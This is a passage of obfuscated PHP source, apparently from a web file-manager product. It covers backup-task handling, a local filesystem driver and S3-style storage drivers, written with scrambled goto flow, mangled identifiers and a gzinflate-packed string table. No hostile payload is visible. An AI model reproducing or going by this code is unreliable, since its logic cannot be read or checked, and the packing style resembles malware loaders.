($EÚ»Ô¨½‰š as $E‹º¡«ºÄ) { if (isset($d§èŸ¸ßŸ[$E‹º¡«ºÄ])) { $EÚ»Ô¨½‰š = array_merge($EÚ»Ô¨½‰š, $d§èŸ¸ßŸ[$E‹º¡«ºÄ]); } } $EÚ»Ô¨½‰š[] = self::AUTH_SHOW; $A¦¡ÏæÄÖ = array_sum(array_unique($EÚ»Ô¨½‰š)); goto cÖê«˜³ƒ¼; cÖê«˜³ƒ¼: } public function sort($b„²œ§šå, $bèäˆ®ÓË¥) { return parent::update($b„²œ§šå, $bèäˆ®ÓË¥); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\142\141\x63\x6b\165\x70\114\x69\163\164"; public $field = array("\x69\157", "\156\x61\155\x65", "\x73\x74\141\x74\x75\x73", "\x63\157\x6e\x74\145\x6e\x74", "\162\x65\163\x75\x6c\x74", "\164\151\155\145\x46\x72\157\155", "\x74\x69\x6d\x65\x54\x6f"); public function config() { goto cÌ¹¬·É¨†; c´«³´ÂĞ—: Action($EÆà÷ãõ¥º[1681])->taskInit(); $AØÉáİÌˆÇ = Model($EÆà÷ãõ¥º[1682])->listData(); foreach ($AØÉáİÌˆÇ as $AÅ’ÅË‰Ö‚) { if ($AÅ’ÅË‰Ö‚[$EÆà÷ãõ¥º[1142]] == $EÆà÷ãõ¥º[86] && $AÅ’ÅË‰Ö‚[$EÆà÷ãõ¥º[1487]] == $EÆà÷ãõ¥º[1683]) { $Câ‹ÉŒšíñ = $AÅ’ÅË‰Ö‚; break; } } goto eõä´öµİñ; eõä´öµİñ: if (isset($Câ‹ÉŒšíñ[$EÆà÷ãõ¥º[195]])) { $Câ‹ÉŒšíñ[$EÆà÷ãõ¥º[195]] = json_decode($Câ‹ÉŒšíñ[$EÆà÷ãõ¥º[195]], !0); } if (isset($bãœ„¥µšé[$EÆà÷ãõ¥º[195]])) { $Câ‹ÉŒšíñ[$EÆà÷ãõ¥º[195]][$EÆà÷ãõ¥º[1472]] = $bãœ„¥µšé[$EÆà÷ãõ¥º[195]]; unset($bãœ„¥µšé[$EÆà÷ãõ¥º[195]]); } return array_merge($Câ‹ÉŒšíñ, $bãœ„¥µšé); goto fÑÖˆ³º¦ğ; FššØøï¡Ë: $bãœ„¥µšé = is_array($bãœ„¥µšé) ? $bãœ„¥µšé : array(); if (!isset($bãœ„¥µšé[$EÆà÷ãõ¥º[715]])) { $bãœ„¥µšé[$EÆà÷ãõ¥º[715]] = $EÆà÷ãõ¥º[86]; } $Câ‹ÉŒšíñ = array(); goto c´«³´ÂĞ—; cÌ¹¬·É¨†: $EÆà÷ãõ¥º =& $_SERVER[¢ÌÛ]; $bãœ„¥µšé = Model($EÆà÷ãõ¥º[1099])->get($EÆà÷ãõ¥º[736]); $bãœ„¥µšé = json_decode($bãœ„¥µšé, !0); goto FššØøï¡Ë; fÑÖˆ³º¦ğ: } public function listData($a¼êÉ˜»’ = false, $CÉ¥„Ğø‘ = "\155\157\x64\x69\146\x79\x54\151\x6d\x65", $Eí¶±»Ó = false) { return parent::listData($a¼êÉ˜»’, $CÉ¥„Ğø‘, !0); } public function lastItem() { $Fº”ƒÂêÀ = $this->listData(); return !empty($Fº”ƒÂêÀ[0]) ? $Fº”ƒÂêÀ[0] : null; } public function kill($A²½èÖÕê’) { goto e½¨ÍÂ¦Â¶; b›¦ëòË¤Ş: return $this->remove($A²½èÖÕê’); goto BÁğ©½Ÿæù; cà¬ï’ºÊ¸: $E¼™Ê†÷„å = $f”ÁóÚÓãä[$Cƒø¯œ—ß[28]]; $a¨Ûøë— = TEMP_FILES . $Cƒø¯œ—ß[732] . $E¼™Ê†÷„å . $Cƒø¯œ—ß[8]; IO::remove($a¨Ûøë—, !1); goto b›¦ëòË¤Ş; FÆƒ’Œ‡Ú: Task::kill($Cƒø¯œ—ß[735]); Task::kill($Cƒø¯œ—ß[752]); Task::kill($Cƒø¯œ—ß[759]); goto cà¬ï’ºÊ¸; e½¨ÍÂ¦Â¶: $Cƒø¯œ—ß =& $_SERVER[¢ÌÛ]; $f”ÁóÚÓãä = $this->listData($A²½èÖÕê’); if (!$f”ÁóÚÓãä || empty($f”ÁóÚÓãä[$Cƒø¯œ—ß[28]])) { return !0; } goto FÆƒ’Œ‡Ú; BÁğ©½Ÿæù: } public function remove($dËŸÙÓ°Ä¡) { $F­‡¤†ÂÊí = $this->listData($dËŸÙÓ°Ä¡); if (!$F­‡¤†ÂÊí) { return !0; } return $this->backupRemove($F­‡¤†ÂÊí); } private function backupRemove($DŒ§Ëá÷‰•) { $f¾íë÷ìÑ¯ =& $_SERVER[¢ÌÛ]; parent::remove($DŒ§Ëá÷‰•[$f¾íë÷ìÑ¯[385]]); $E›ğéªà©è = "\x7b\x69\x6f\x3a{$DŒ§Ëá÷‰•[$f¾íë÷ìÑ¯[714]]}\175\x2f\144\x61\x74\141\142\141\163\x65\57\142\x61\143\x6b\x75\x70\137" . $DŒ§Ëá÷‰•[$f¾íë÷ìÑ¯[28]]; IO::remove($E›ğéªà©è, !1); return !0; } public function start() { goto CÖÄ’Êí„„; Eğ«Œ˜Î“: if ($B•Ú½š´Áå) { $B•Ú½š´Áå = $BÙ¯–â¥->dbFile(); if ($B•Ú½š´Áå && $A…‘ˆ ©[$Eº‹™¤Í¾[715]] == $Eº‹™¤Í¾[495]) { $B•Ú½š´Áå = $BÙ¯–â¥->file(); } } Backup::set(array($Eº‹™¤Í¾[712] => 1, $Eº‹™¤Í¾[474] => time())); return !0; goto Eãâ¡İ‘í…; Dœò±‰â©: if (!$A…‘ˆ © || $A…‘ˆ ©[$Eº‹™¤Í¾[1469]] != $Eº‹™¤Í¾[86]) { return !1; } $AŠî¸‹öÑ = $this->process(); foreach ($AŠî¸‹öÑ as $CÈİá‘…Ÿç) { if ($CÈİá‘…Ÿç) { return Task::restart($CÈİá‘…Ÿç[$Eº‹™¤Í¾[385]]); } } goto a©‰ÔÈÌ°; CÖÄ’Êí„„: $Eº‹™¤Í¾ =& $_SERVER[¢ÌÛ]; if ($GLOBALS[$Eº‹™¤Í¾[6]][$Eº‹™¤Í¾[87]][$Eº‹™¤Í¾[1684]] != $Eº‹™¤Í¾[86]) { return !0; } $A…‘ˆ © = $this->config(); goto Dœò±‰â©; a©‰ÔÈÌ°: $BÙ¯–â¥ = new Backup(); $BÙ¯–â¥->keep(); $B•Ú½š´Áå = $BÙ¯–â¥->db(); goto Eğ«Œ˜Î“; Eãâ¡İ‘í…: } public function process() { $e“£×é´ß³ =& $_SERVER[¢ÌÛ]; return array($e“£×é´ß³[717] => Task::get($e“£×é´ß³[735]), $e“£×é´ß³[720] => Task::get($e“£×é´ß³[752]), $e“£×é´ß³[173] => Task::get($e“£×é´ß³[759])); } public function restore() { $cé£Ÿ×ö¤ =& $_SERVER[¢ÌÛ]; ActionCall($cé£Ÿ×ö¤[995], !0, 1); ActionCall($cé£Ÿ×ö¤[995], !0, 0); } } goto Bá™‹ÍÖ‰Š; fÀ‘Š¬åœ: $BŠ‰ößî• = $_SERVER[¢ÌÛ][572]; $_SERVER[‹¶] = explode($_SERVER[¢ÌÛ][573], gzinflate(substr($_SERVER[¢ÌÛ][574], 10, -8))); $dİòÊ¾Ú = $_SERVER[¢ÌÛ][575]; goto F‚êõ›«¹î; b‘†Şê†ÆÍ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($cê„˜ôÎŞÂ) { if (substr($cê„˜ôÎŞÂ, 0, 2) == $_SERVER[¢ÌÛ][1216]) { $cê„˜ôÎŞÂ = BASIC_PATH . substr($cê„˜ôÎŞÂ, 2); } return $cê„˜ôÎŞÂ; } public function iconvApp($a¶–ñÑŠ) { $A¶Èİ×º²ˆ =& $_SERVER[¢ÌÛ]; global $config; return $this->iconvTo($a¶–ñÑŠ, $config[$A¶Èİ×º²ˆ[1214]], $config[$A¶Èİ×º²ˆ[1213]]); } public function iconvSystem($EİÓæ¯¸ŸÖ) { $AâÍ¼–Şà± =& $_SERVER[¢ÌÛ]; global $config; return $this->iconvTo($EİÓæ¯¸ŸÖ, $config[$AâÍ¼–Şà±[1213]], $config[$AâÍ¼–Şà±[1214]]); } public function getPathOuter($dØìâ¸¼¨) { goto BÀ™©·”¾; A½Ï²Óí‚: return $this->pathDriver . $FñÜ¸±ª«¼[8] . ltrim($dØìâ¸¼¨, $FñÜ¸±ª«¼[8]); goto E×¾§™à·; fÛÖ¿Î§‘Ü: $dØìâ¸¼¨ = KodIO::clear($dØìâ¸¼¨); $dØìâ¸¼¨ = substr($dØìâ¸¼¨, strlen($F‹¯Ÿ¯ºÜ)); if (empty($this->pathDriver)) { return $dØìâ¸¼¨; } goto A½Ï²Óí‚; aä¶Øš¨®: if (substr($F‹¯Ÿ¯ºÜ, 0, 2) == $FñÜ¸±ª«¼[1216]) { $F‹¯Ÿ¯ºÜ = BASIC_PATH . substr($F‹¯Ÿ¯ºÜ, 2); } if (substr($dØìâ¸¼¨, 0, 2) == $FñÜ¸±ª«¼[1216]) { $dØìâ¸¼¨ = BASIC_PATH . substr($dØìâ¸¼¨, 2); } $F‹¯Ÿ¯ºÜ = KodIO::clear($F‹¯Ÿ¯ºÜ); goto fÛÖ¿Î§‘Ü; BÀ™©·”¾: $FñÜ¸±ª«¼ =& $_SERVER[¢ÌÛ]; $F‹¯Ÿ¯ºÜ = $this->iconvApp($this->pathBase); $dØìâ¸¼¨ = $this->iconvApp($dØìâ¸¼¨); goto aä¶Øš¨®; E×¾§™à·: } public function mkfile($cŠ‹²ãš×Ö, $d‹Ì÷ç¾õ½ = '', $Eåã£Øˆœ = REPEAT_RENAME) { $cŠ‹²ãš×Ö = $this->iconvSystem($cŠ‹²ãš×Ö); @touch($cŠ‹²ãš×Ö); if ($d‹Ì÷ç¾õ½) { file_put_contents($cŠ‹²ãš×Ö, $d‹Ì÷ç¾õ½); } return is_file($cŠ‹²ãš×Ö) ? $this->getPathOuter($cŠ‹²ãš×Ö) : !1; } public function mkdir($CÉ¶¤ßô…ã, $eÌˆÄ•ˆß = REPEAT_SKIP) { $CÉ¶¤ßô…ã = $this->iconvSystem($CÉ¶¤ßô…ã); if (is_dir($CÉ¶¤ßô…ã)) { return $this->getPathOuter($CÉ¶¤ßô…ã); } @mkdir($CÉ¶¤ßô…ã, 511, !0); return is_dir($CÉ¶¤ßô…ã) ? $this->getPathOuter($CÉ¶¤ßô…ã) : !1; } public function copyFile($féÇ Ñ”å, $C•…¿…àäÓ) { $this->mkdir($this->pathFather($C•…¿…àäÓ)); $féÇ Ñ”å = $this->iconvSystem($féÇ Ñ”å); $C•…¿…àäÓ = $this->iconvSystem($C•…¿…àäÓ); $c®ôË¸ = copy_64($féÇ Ñ”å, $C•…¿…àäÓ); return $c®ôË¸ ? $this->getPathOuter($C•…¿…àäÓ) : !1; } public function moveFile($d½“Áˆ¦„ò, $eŠÌÑ§º‰¨) { $this->mkdir($this->pathFather($eŠÌÑ§º‰¨)); $d½“Áˆ¦„ò = $this->iconvSystem($d½“Áˆ¦„ò); $eŠÌÑ§º‰¨ = $this->iconvSystem($eŠÌÑ§º‰¨); $fÔÙùĞÍ¯¼ = intval(@rename($d½“Áˆ¦„ò, $eŠÌÑ§º‰¨)); if (!$fÔÙùĞÍ¯¼) { if ($fÔÙùĞÍ¯¼ = intval(@copy_64($d½“Áˆ¦„ò, $eŠÌÑ§º‰¨))) { @unlink($d½“Áˆ¦„ò); } } return $fÔÙùĞÍ¯¼ ? $this->getPathOuter($eŠÌÑ§º‰¨) : !1; } public function delFile($E„ÓÒ®ôÊŸ) { $E„ÓÒ®ôÊŸ = $this->iconvSystem($E„ÓÒ®ôÊŸ); if (!@unlink($E„ÓÒ®ôÊŸ)) { @chmod($E„ÓÒ®ôÊŸ, 511); if (!@unlink($E„ÓÒ®ôÊŸ)) { return !1; } } else { return !0; } } public function delFolder($EÔî‡½ß) { goto cÆí“ÜÃÁæ; cÆí“ÜÃÁæ: $báÛŠ¿Åø =& $_SERVER[¢ÌÛ]; $EÔî‡½ß = $this->iconvSystem($EÔî‡½ß); if (!is_dir($EÔî‡½ß)) { return !0; } goto A¶‘Œå; A¶‘Œå: if (!($CŸ•ø„İ¢ = opendir($EÔî‡½ß))) { return !1; } while (($Aç ëÈ¡×¦ = readdir($CŸ•ø„İ¢)) !== !1) { if ($Aç ëÈ¡×¦ == $báÛŠ¿Åø[94] || $Aç ëÈ¡×¦ == $báÛŠ¿Åø[1223]) { continue; } $céß•ë´Ò = $EÔî‡½ß . $báÛŠ¿Åø[8] . $Aç ëÈ¡×¦; if (is_file($céß•ë´Ò) || is_link($céß•ë´Ò)) { if (!unlink($céß•ë´Ò)) { chmod($céß•ë´Ò, 511); if (!unlink($céß•ë´Ò)) { return !1; } } } else { if (is_dir($céß•ë´Ò)) { chmod($céß•ë´Ò, 511); $céß•ë´Ò = $this->iconvApp($céß•ë´Ò); if (!$this->delFolder($céß•ë´Ò)) { return !1; } } } } closedir($CŸ•ø„İ¢); goto B˜Š¹ˆÓ­£; B˜Š¹ˆÓ­£: return rmdir($EÔî‡½ß); goto dÏ¬©£÷æ; dÏ¬©£÷æ: } public function rename($b½‹æ›¸, $EÕ¸¿—“Ä) { goto e©ÔÙ©î; c±ç¼’ö©ƒ: $Eï­¸¤¶ˆ« = @rename($b½‹æ›¸, $F©Š’íù¼–); $F©Š’íù¼– = $this->iconvApp($F©Š’íù¼–); return $Eï­¸¤¶ˆ« ? $this->getPathOuter($F©Š’íù¼–) : !1; goto cò”Ú‘ó›; e©ÔÙ©î: $B³‹µöµÀ½ =& $_SERVER[¢ÌÛ]; $b˜¦ÉÇ¶Ï¤ = $this->fileNameAuto($this->pathFather($b½‹æ›¸), $EÕ¸¿—“Ä); $b˜¦ÉÇ¶Ï¤ = $this->iconvSystem($b˜¦ÉÇ¶Ï¤); goto b¢ó¡‚»½‡; b¢ó¡‚»½‡: $b½‹æ›¸ = $this->iconvSystem($b½‹æ›¸); $C‘ÀÊŒµß = $this->pathFather($b½‹æ›¸); $F©Š’íù¼– = rtrim($C‘ÀÊŒµß, $B³‹µöµÀ½[8]) . $B³‹µöµÀ½[8] . $b˜¦ÉÇ¶Ï¤; goto c±ç¼’ö©ƒ; cò”Ú‘ó›: } public function size($EæâÖ¾¿ ) { $EæâÖ¾¿  = $this->iconvSystem($EæâÖ¾¿ ); return filesize_64($EæâÖ¾¿ ); } public function info($câ¦Â©›ª¤) { $câ¦Â©›ª¤ = $this->iconvSystem($câ¦Â©›ª¤); if ($this->isFolder($câ¦Â©›ª¤)) { return $this->folderInfo($câ¦Â©›ª¤); } else { if ($this->isFile($câ¦Â©›ª¤)) { return $this->fileInfo($câ¦Â©›ª¤); } } return !1; } protected function infoChildren($AåŞŒ„£ÍÄ, &$b¢‰½Å——í, $cë¶¯îÜÏ‡ = true) { goto fÆ¹¯ÍøÛÕ; c©Šˆ½•¸: closedir($a›ÙÀáåíÙ); goto E¸ÚÍôŒ¨Ò; fÆ¹¯ÍøÛÕ: $DåèÈ‘İ¶Ä =& $_SERVER[¢ÌÛ]; check_abort_echo(); $AåŞŒ„£ÍÄ = rtrim($AåŞŒ„£ÍÄ, $DåèÈ‘İ¶Ä[8]) . $DåèÈ‘İ¶Ä[8]; goto eÁÜ¥Æ÷ºÀ; eÁÜ¥Æ÷ºÀ: if ($cë¶¯îÜÏ‡) { $AåŞŒ„£ÍÄ = $this->iconvSystem($AåŞŒ„£ÍÄ); } if (!($a›ÙÀáåíÙ = @opendir($AåŞŒ„£ÍÄ))) { return; } while (($aÒˆƒÃÊˆ› = readdir($a›ÙÀáåíÙ)) !== !1) { if ($aÒˆƒÃÊˆ› == $DåèÈ‘İ¶Ä[94] || $aÒˆƒÃÊˆ› == $DåèÈ‘İ¶Ä[1223]) { continue; } $c…‡À¶óÄ = $AåŞŒ„£ÍÄ . $aÒˆƒÃÊˆ›; if (is_file($c…‡À¶óÄ) || is_link($c…‡À¶óÄ)) { $b¢‰½Å——í[$DåèÈ‘İ¶Ä[78]]++; $b¢‰½Å——í[$DåèÈ‘İ¶Ä[77]] += filesize_64($c…‡À¶óÄ); } else { if (is_dir($c…‡À¶óÄ)) { $b¢‰½Å——í[$DåèÈ‘İ¶Ä[79]]++; $this->infoChildren($c…‡À¶óÄ, $b¢‰½Å——í, !1); } } } goto c©Šˆ½•¸; E¸ÚÍôŒ¨Ò: } private function folderInfo($BšŒ½‚, $B‘íŒ¢Ä¼ = false) { $E¯é—‰Îà” =& $_SERVER[¢ÌÛ]; $BšŒ½‚ = rtrim($BšŒ½‚, $E¯é—‰Îà”[8]) . $E¯é—‰Îà”[8]; $aïªÂ¡“ó˜ = $this->iconvApp($this->pathThis($BšŒ½‚)); if ($B‘íŒ¢Ä¼) { return array($E¯é—‰Îà”[28] => $aïªÂ¡“ó˜, $E¯é—‰Îà”[75] => $this->getPathOuter($BšŒ½‚), $E¯é—‰Îà”[29] => $E¯é—‰Îà”[76]); } $CÇ……‚¾” = array($E¯é—‰Îà”[28] => $aïªÂ¡“ó˜, $E¯é—‰Îà”[75] => $this->getPathOuter($BšŒ½‚), $E¯é—‰Îà”[29] => $E¯é—‰Îà”[76], $E¯é—‰Îà”[192] => @filectime($BšŒ½‚), $E¯é—‰Îà”[83] => @filemtime($BšŒ½‚), $E¯é—‰Îà”[1226] => @fileatime($BšŒ½‚), $E¯é—‰Îà”[1227] => is_readable($BšŒ½‚), $E¯é—‰Îà”[1228] => is_writable($BšŒ½‚), $E¯é—‰Îà”[1229] => get_mode($BšŒ½‚)); return $CÇ……‚¾”; } private function fileInfo($F©ºËõìç, $FÔ“×Éõ¨à = false) { $Aî¹ê³ · =& $_SERVER[¢ÌÛ]; $e¢„ÙÍôø˜ = $this->iconvApp($this->pathThis($F©ºËõìç)); if ($FÔ“×Éõ¨à) { return array($Aî¹ê³ ·[28] => $e¢„ÙÍôø˜, $Aî¹ê³ ·[75] => $this->getPathOuter($F©ºËõìç), $Aî¹ê³ ·[29] => $Aî¹ê³ ·[173], $Aî¹ê³ ·[77] => $this->size($F©ºËõìç), $Aî¹ê³ ·[167] => $this->ext($e¢„ÙÍôø˜)); } $BÑ·öä‹´ë = array($Aî¹ê³ ·[28] => $e¢„ÙÍôø˜, $Aî¹ê³ ·[75] => $this->getPathOuter($F©ºËõìç), $Aî¹ê³ ·[29] => $Aî¹ê³ ·[173], $Aî¹ê³ ·[192] => @filectime($F©ºËõìç), $Aî¹ê³ ·[83] => @filemtime($F©ºËõìç), $Aî¹ê³ ·[1226] => @fileatime($F©ºËõìç), $Aî¹ê³ ·[77] => $this->size($F©ºËõìç), $Aî¹ê³ ·[167] => $this->ext($e¢„ÙÍôø˜), $Aî¹ê³ ·[1227] => is_readable($F©ºËõìç), $Aî¹ê³ ·[1228] => is_writable($F©ºËõìç), $Aî¹ê³ ·[1229] => get_mode($F©ºËõìç)); return $BÑ·öä‹´ë; } public function exist($a šÙ…Ó¨²) { $a šÙ…Ó¨² = $this->iconvSystem($a šÙ…Ó¨²); return @file_exists($a šÙ…Ó¨²); } public function isFile($D‘Ø½Åààò) { $D‘Ø½Åààò = $this->iconvSystem($D‘Ø½Åààò); return @is_file($D‘Ø½Åààò); } public function isFolder($B¯±ãÒàª) { $B¯±ãÒàª = $this->iconvSystem($B¯±ãÒàª); return @is_dir($B¯±ãÒàª); } public function listPath($d»œ¶µœ¼, $EÀö˜÷‚¥§ = false) { goto aÏŒ…Ø½£; aÏŒ…Ø½£: $b§ˆÃÖ†­À =& $_SERVER[¢ÌÛ]; $d»œ¶µœ¼ = $this->iconvSystem($d»œ¶µœ¼); $d»œ¶µœ¼ = rtrim($d»œ¶µœ¼, $b§ˆÃÖ†­À[8]) . $b§ˆÃÖ†­À[8]; goto AáèâöÁ; cçŸ¨ÃÏ¬: closedir($däéôÃ‘); return $eğœˆµÅÆ¬; goto bÜÕØö–Ú; AáèâöÁ: $eğœˆµÅÆ¬ = array($b§ˆÃÖ†­À[74] => array(), $b§ˆÃÖ†­À[73] => array()); if (!($däéôÃ‘ = @opendir($d»œ¶µœ¼))) { return $eğœˆµÅÆ¬; } while (($eä÷“ä–¦ = readdir($däéôÃ‘)) !== !1) { if ($eä÷“ä–¦ == $b§ˆÃÖ†­À[94] || $eä÷“ä–¦ == $b§ˆÃÖ†­À[1223]) { continue; } $f„ğŒë¡é = $d»œ¶µœ¼ . $eä÷“ä–¦; if (is_file($f„ğŒë¡é)) { $eğœˆµÅÆ¬[$b§ˆÃÖ†­À[73]][] = $this->fileInfo($f„ğŒë¡é, $EÀö˜÷‚¥§); } else { $eğœˆµÅÆ¬[$b§ˆÃÖ†­À[74]][] = $this->folderInfo($f„ğŒë¡é, $EÀö˜÷‚¥§); } } goto cçŸ¨ÃÏ¬; bÜÕØö–Ú: } public function listAll($f£éñëâï, &$a¦‡©ğ¡¦ = array()) { goto DÀ„…ë¨Ñ; c°¨¶“‰¯º: if (!($bšÌïŒ¾ = @opendir($f£éñëâï))) { return $a¦‡©ğ¡¦; } while (($EÖ•Ü¨ áŸ = readdir($bšÌïŒ¾)) !== !1) { if ($EÖ•Ü¨ áŸ == $A£©¦©íĞ½[94] || $EÖ•Ü¨ áŸ == $A£©¦©íĞ½[1223]) { continue; } $eÌŠéÜõ÷õ = $f£éñëâï . $EÖ•Ü¨ áŸ; if (is_dir($eÌŠéÜõ÷õ) && !is_link($eÌŠéÜõ÷õ)) { $a¦‡©ğ¡¦[] = array($A£©¦©íĞ½[75] => $eÌŠéÜõ÷õ . $A£©¦©íĞ½[8], $A£©¦©íĞ½[76] => 1, $A£©¦©íĞ½[83] => @filemtime($eÌŠéÜõ÷õ), $A£©¦©íĞ½[77] => 0); $this->listAll($eÌŠéÜõ÷õ, $a¦‡©ğ¡¦); } else { $a¦‡©ğ¡¦[] = array($A£©¦©íĞ½[75] => $eÌŠéÜõ÷õ, $A£©¦©íĞ½[76] => 0, $A£©¦©íĞ½[83] => @filemtime($eÌŠéÜõ÷õ), $A£©¦©íĞ½[77] => $this->size($eÌŠéÜõ÷õ)); } } closedir($bšÌïŒ¾); goto AÅÀ´ÃÔ–æ; DÀ„…ë¨Ñ: $A£©¦©íĞ½ =& $_SERVER[¢ÌÛ]; $f£éñëâï = $this->iconvSystem($f£éñëâï); $f£éñëâï = rtrim($f£éñëâï, $A£©¦©íĞ½[8]) . $A£©¦©íĞ½[8]; goto c°¨¶“‰¯º; AÅÀ´ÃÔ–æ: return $a¦‡©ğ¡¦; goto C†Àê×¹Ğä; C†Àê×¹Ğä: } public function has($A‘Âì”¾ò…, $B§•ç‹›¼ = false, $B±¾½ÉìÕ• = true) { goto a‡÷öö”Ğ¯; bÛÇ¡ÕÖ™: if (!($fÔ¢³ËÅ = @opendir($A‘Âì”¾ò…))) { return !1; } $aŠàï†Ø˜á = 0; $dÃİƒŠêëÕ = 0; goto b§ÍÚ±ĞÂô; b§ÍÚ±ĞÂô: $Fù¥ŒãŠ¡İ = 0; while (($b©•Ã¼áÎ‹ = readdir($fÔ¢³ËÅ)) !== !1) { if ($b©•Ã¼áÎ‹ == $dª­ •ƒÄ[94] || $b©•Ã¼áÎ‹ == $dª­ •ƒÄ[1223]) { continue; } $cÊ´•‰¦¡ = $A‘Âì”¾ò… . $b©•Ã¼áÎ‹; if ($B§•ç‹›¼) { $Fù¥ŒãŠ¡İ++; if (@is_file($cÊ´•‰¦¡)) { $aŠàï†Ø˜á++; } else { $dÃİƒŠêëÕ++; } if ($Fù¥ŒãŠ¡İ > 10000) { break; } continue; } if ($B±¾½ÉìÕ•) { if (@is_file($cÊ´•‰¦¡)) { return !0; } } else { if (@is_dir($cÊ´•‰¦¡ . $dª­ •ƒÄ[8])) { return !0; } } } closedir($fÔ¢³ËÅ); goto Bºé·ÂÇÛ±; a‡÷öö”Ğ¯: $dª­ •ƒÄ =& $_SERVER[¢ÌÛ]; $A‘Âì”¾ò… = $this->iconvSystem($A‘Âì”¾ò…); $A‘Âì”¾ò… = rtrim($A‘Âì”¾ò…, $dª­ •ƒÄ[8]) . $dª­ •ƒÄ[8]; goto bÛÇ¡ÕÖ™; Bºé·ÂÇÛ±: if ($B§•ç‹›¼) { return array($dª­ •ƒÄ[201] => $aŠàï†Ø˜á, $dª­ •ƒÄ[202] => $dÃİƒŠêëÕ); } return !1; goto AÇ‚ƒÏ˜î‘; AÇ‚ƒÏ˜î‘: } public function hashSimple($f³Åµ‰Â¾ó) { goto B‡•†®‹Â¤; Eö®ò¸à›–: $dœÊñò˜½ç = fopen($f³Åµ‰Â¾ó, $fŸ¹‹’‘ôÏ[1230]); if (!$dœÊñò˜½ç) { return $eèÍ†£·í”; } for ($F½ÛŞ²Û«Ğ = 0; $F½ÛŞ²Û«Ğ < $B¼•—‹Óºç; $F½ÛŞ²Û«Ğ++) { fseek_64($dœÊñò˜½ç, $fØæ÷¡°áñ * $F½ÛŞ²Û«Ğ); $eèÍ†£·í” .= fread($dœÊñò˜½ç, $B›“½›‘İÄ); } goto d…»ãœ®ôÕ; eŠÑÕ±„à: return md5($eèÍ†£·í”) . $FãĞÉ¥·³Â; goto Eö¶ñÒÁñà; bÁğ’˜Ï†: $FãĞÉ¥·³Â = $this->size($f³Åµ‰Â¾ó); $B›“½›‘İÄ = 200; $B¼•—‹Óºç = 50; goto F˜ôÓ×®À«; d…»ãœ®ôÕ: fseek_64($dœÊñò˜½ç, $FãĞÉ¥·³Â - $B›“½›‘İÄ); $eèÍ†£·í” .= fread($dœÊñò˜½ç, $B›“½›‘İÄ); fclose($dœÊñò˜½ç); goto eŠÑÕ±„à; B‡•†®‹Â¤: $fŸ¹‹’‘ôÏ =& $_SERVER[¢ÌÛ]; if (!$f³Åµ‰Â¾ó) { return md5($fŸ¹‹’‘ôÏ[33]); } $f³Åµ‰Â¾ó = $this->iconvSystem($f³Åµ‰Â¾ó); goto bÁğ’˜Ï†; F˜ôÓ×®À«: if ($FãĞÉ¥·³Â <= $B›“½›‘İÄ * $B¼•—‹Óºç) { return $this->hashMd5($f³Åµ‰Â¾ó) . $FãĞÉ¥·³Â; } $eèÍ†£·í” = $fŸ¹‹’‘ôÏ[33]; $fØæ÷¡°áñ = intval($FãĞÉ¥·³Â / $B¼•—‹Óºç); goto Eö®ò¸à›–; Eö¶ñÒÁñà: } public function getContent($C½ˆ¨İ—Ï—) { $C½ˆ¨İ—Ï— = $this->iconvSystem($C½ˆ¨İ—Ï—); return file_get_contents($C½ˆ¨İ—Ï—); } public function setContent($b„¹îˆ˜—É, $Dî…­õâî‡ = '') { $b„¹îˆ˜—É = $this->iconvSystem($b„¹îˆ˜—É); $D‘Ø¼ƒ×ô = @file_put_contents($b„¹îˆ˜—É, $Dî…­õâî‡, LOCK_EX); clearstatcache(); return $D‘Ø¼ƒ×ô === !1 ? !1 : !0; } public function fileSubstr($a¤êŒÌ¶µœ, $BÓÕÄ°İòí = 0, $e¶íÂŠŞÆ = false) { goto cÁØ¹âÈ‹Ş; F‘•Ò•êßè: return $e¶´ÛÑÚ©; goto Eƒİ‘Äçƒ®; CÍÄšÀåªŞ: if ($e¶íÂŠŞÆ <= 0) { return $CŒù³” “[33]; } $Dğ´á­ëíÛ = fopen($a¤êŒÌ¶µœ, $CŒù³” “[1230]); if (!$Dğ´á­ëíÛ) { return !1; } goto B¨½Õ¡´×±; cÁØ¹âÈ‹Ş: $CŒù³” “ =& $_SERVER[¢ÌÛ]; $a¤êŒÌ¶µœ = $this->iconvSystem($a¤êŒÌ¶µœ); if ($e¶íÂŠŞÆ === !1) { $e¶íÂŠŞÆ = $this->size($a¤êŒÌ¶µœ); } goto CÍÄšÀåªŞ; B¨½Õ¡´×±: fseek_64($Dğ´á­ëíÛ, $BÓÕÄ°İòí); $e¶´ÛÑÚ© = fread($Dğ´á­ëíÛ, $e¶íÂŠŞÆ); fclose($Dğ´á­ëíÛ); goto F‘•Ò•êßè; Eƒİ‘Äçƒ®: } public function upload($b¤…á…•£, $FçŠ§ß¹µ¶, $FìŒ‰¸ïõ = false, $cÚ¿ï¨“Õ = REPEAT_REPLACE) { $Bæï³èÃÆ¾ = $this->copyFile($FçŠ§ß¹µ¶, $b¤…á…•£); return $Bæï³èÃÆ¾ ? $this->getPathOuter($b¤…á…•£) : !1; } public function setModifyTime($bŸÎ«ñ¢Å‹, $bœ Ó”æé˜ = '') { @touch($bŸÎ«ñ¢Å‹, intval($bœ Ó”æé˜)); } public function download($b•¤˜‘ Å¹, $Dˆ—è‹Ñğ„) { return $this->iconvSystem($b•¤˜‘ Å¹); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($b›òñÁÂÍ) { parent::__construct($b›òñÁÂÍ); $this->signatureVersion($_SERVER[¢ÌÛ][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Dµ×•¨‰ùÀ) { parent::__construct($Dµ×•¨‰ùÀ); $this->signatureVersion($_SERVER[¢ÌÛ][210]); } public function fileOutLink($EÁîš®¿Œ¦) { $A¤¨ÂÜ¬Ì =& $_SERVER[¢ÌÛ]; if (substr($EÁîš®¿Œ¦, 0, 7) == $A¤¨ÂÜ¬Ì[1176]) { $EÁîš®¿Œ¦ = $A¤¨ÂÜ¬Ì[1177] . substr($EÁîš®¿Œ¦, 7); } header($A¤¨ÂÜ¬Ì[158] . $EÁîš®¿Œ¦); die; } } goto B¿ĞÉæÌÙ; F¦Ş†¶¡¦˜: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\151\x6d\145", "\164\x69\x6d\145", 